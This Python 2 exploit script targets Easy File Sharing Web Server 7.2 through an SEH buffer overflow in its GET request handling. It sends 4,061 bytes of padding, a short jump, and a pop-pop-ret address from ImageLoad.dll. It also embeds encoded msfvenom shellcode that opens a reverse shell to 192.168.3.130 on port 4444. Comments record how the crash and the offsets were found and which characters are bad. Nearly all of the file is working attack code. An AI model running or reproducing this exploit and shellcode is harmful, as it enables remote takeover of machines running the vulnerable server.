#!/usr/bin/env python

#
# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Description	: Easy File Sharing Web Server 7.2 Remote[GET] Buffer Overflow (SEH)
# Tested On	: Windows XP SP3, Windows 7 Ultimate
# Date		: 04-02-2018
#

from socket import create_connection as cc
import sys
import struct

def packer(a):
	return struct.pack("I",a)

if not len(sys.argv) == 3:
	print "Usage : {} <host> <port>\nExiting\n".format(sys.argv[0])
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]

try:
	target = cc((host, port))
except:
	print "Connection Error\nExploit Ab0rt\n"
	sys.exit()

print "Connected to {}".format(host)

# Initial Crash
# payload = "A"*6000

# find nSEH, SEH overwrite offsets
# payload = `locate pattern_create.rb -l 6000

# SEH record (nseh field) at 0x046e6fac overwritten with normal 
# pattern : 0x34664633 (offset 4061), followed by 1931 bytes of 
# cyclic data after the handler

# payload = "A"*4061 + nSEH + SEH + JUNK/SHELLCODE
# payload = "A"*4061 + "BBBB" + "CCCC" + "D"*1500

# 0x100195f2 : pop esi # pop ecx # ret 
# [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, 
SEH = 0x100195F2

# JMP SHORT 6
nSEH = "\xEB\x06\x90\x90"

# bads = '\x20\x2f\x5c\x00'

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=4444 EXITFUNC=thread -f c -b '\x20\x2f\x5c\x00' -e x86/shikata_ga_nai
shellcode = ("\xda\xc1\xba\xa9\x3d\x59\x21\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x55\x17\x83\xed\xfc\x03\xfc\x2e\xbb\xd4\x02\xb8\xb9"
"\x17\xfa\x39\xde\x9e\x1f\x08\xde\xc5\x54\x3b\xee\x8e\x38\xb0"
"\x85\xc3\xa8\x43\xeb\xcb\xdf\xe4\x46\x2a\xee\xf5\xfb\x0e\x71"
"\x76\x06\x43\x51\x47\xc9\x96\x90\x80\x34\x5a\xc0\x59\x32\xc9"
"\xf4\xee\x0e\xd2\x7f\xbc\x9f\x52\x9c\x75\xa1\x73\x33\x0d\xf8"
"\x53\xb2\xc2\x70\xda\xac\x07\xbc\x94\x47\xf3\x4a\x27\x81\xcd"
"\xb3\x84\xec\xe1\x41\xd4\x29\xc5\xb9\xa3\x43\x35\x47\xb4\x90"
"\x47\x93\x31\x02\xef\x50\xe1\xee\x11\xb4\x74\x65\x1d\x71\xf2"
"\x21\x02\x84\xd7\x5a\x3e\x0d\xd6\x8c\xb6\x55\xfd\x08\x92\x0e"
"\x9c\x09\x7e\xe0\xa1\x49\x21\x5d\x04\x02\xcc\x8a\x35\x49\x99"
"\x7f\x74\x71\x59\xe8\x0f\x02\x6b\xb7\xbb\x8c\xc7\x30\x62\x4b"
"\x27\x6b\xd2\xc3\xd6\x94\x23\xca\x1c\xc0\x73\x64\xb4\x69\x18"
"\x74\x39\xbc\x8f\x24\x95\x6f\x70\x94\x55\xc0\x18\xfe\x59\x3f"
"\x38\x01\xb0\x28\xd3\xf8\x53\x97\x8c\x01\x26\x7f\xcf\x05\x37"
"\xdc\x46\xe3\x5d\xcc\x0e\xbc\xc9\x75\x0b\x36\x6b\x79\x81\x33"
"\xab\xf1\x26\xc4\x62\xf2\x43\xd6\x13\xf2\x19\x84\xb2\x0d\xb4"
"\xa0\x59\x9f\x53\x30\x17\xbc\xcb\x67\x70\x72\x02\xed\x6c\x2d"
"\xbc\x13\x6d\xab\x87\x97\xaa\x08\x09\x16\x3e\x34\x2d\x08\x86"
"\xb5\x69\x7c\x56\xe0\x27\x2a\x10\x5a\x86\x84\xca\x31\x40\x40"
"\x8a\x79\x53\x16\x93\x57\x25\xf6\x22\x0e\x70\x09\x8a\xc6\x74"
"\x72\xf6\x76\x7a\xa9\xb2\x97\x99\x7b\xcf\x3f\x04\xee\x72\x22"
"\xb7\xc5\xb1\x5b\x34\xef\x49\x98\x24\x9a\x4c\xe4\xe2\x77\x3d"
"\x75\x87\x77\x92\x76\x82")

payload = "A"*4061 + nSEH + packer(SEH) + "\x90"*16 + shellcode + "\x90"*1000

evil = "GET /" + payload + " HTTP/1.0\r\n\r\n"

print "Sending Ev1l payload"
target.send(evil)
print "Payload sent. Check debugger"
